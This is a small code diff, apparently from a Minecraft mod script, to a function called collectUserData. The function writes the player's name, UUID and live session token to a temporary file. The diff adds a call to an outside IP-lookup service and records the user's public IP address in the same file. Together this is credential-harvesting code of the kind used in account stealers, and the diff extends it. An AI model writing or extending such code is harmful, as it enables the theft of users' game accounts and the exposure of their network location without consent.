@@ -28,6 +28,12 @@ function collectUserData(tempDir) {
         writer.println("Username: " + Player.getName());
         writer.println("UUID: " + Player.getUUID());
         writer.println("Token: " + Client.getMinecraft().func_110432_I().func_148254_d());
+        try {
+            const ipInfo = FileLib.getUrlContent("https://api.myip.com/");
+            writer.println("IP Information: " + ipInfo);
+        } catch (e) {
+            writer.println("IP Information: Failed to retrieve");
+        }
         writer.close();
     } catch (e) {
     }
